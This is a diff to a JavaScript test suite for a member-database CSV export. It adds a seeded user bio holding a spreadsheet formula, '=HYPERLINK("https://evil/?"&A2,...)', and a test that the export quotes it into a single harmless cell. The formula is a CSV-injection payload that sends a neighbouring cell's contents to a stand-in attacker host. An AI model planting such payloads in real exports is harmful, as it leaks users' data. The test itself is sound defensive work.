@@ -17,6 +17,7 @@ const U = (n, o = {}) => { const id = Number(db.prepare(`INSERT INTO users (user
 U("boss", { admin: true });
 U("ana", { pronouns: "she/her", links: [{ url: "https://ana.studio" }], stripe: "acct_SECRET123", verified: 0 });
 U("evil", { name: "=HYPERLINK(\"http://bad\",\"x\")" });
+db.prepare(`UPDATE users SET bio = ? WHERE username = 'ana'`).run('hi;=HYPERLINK("https://evil/?"&A2,"x")');
 const many = db.prepare(`INSERT INTO users (username, display_name, email, password_hash, created_at, email_verified) VALUES (?,?,?,?,?,1)`);
 for (let i = 0; i < 330; i++) many.run("m" + i, "Member " + i, `m${i}@x.com`, "h", now - i * 1000);
 
@@ -53,6 +54,7 @@ try {
   t("account information in the row", ana && ana.includes("ana@x.com") && ana.includes(",no,") && ana.includes("she/her") && ana.includes("https://ana.studio") && ana.includes(",started,"));
   t("never a password hash, a session token or a Stripe id", !/HASH-|tok-|acct_SECRET|password/i.test(csv));
   t("a name that looks like a formula stays words", csv.includes(`"'=HYPERLINK(""http://bad"",""x"")"`));
+  t("…and a bio with a ; in it stays one quoted cell (spreadsheets that split on ;)", csv.includes(`"hi;=HYPERLINK(""https://evil/?""&A2,""x"")"`));
   const log = db.prepare(`SELECT action FROM admin_log ORDER BY id DESC LIMIT 1`).get();
   t("every download is in the admin log", log && /downloaded the member database \(333 members\)/.test(log.action));
 
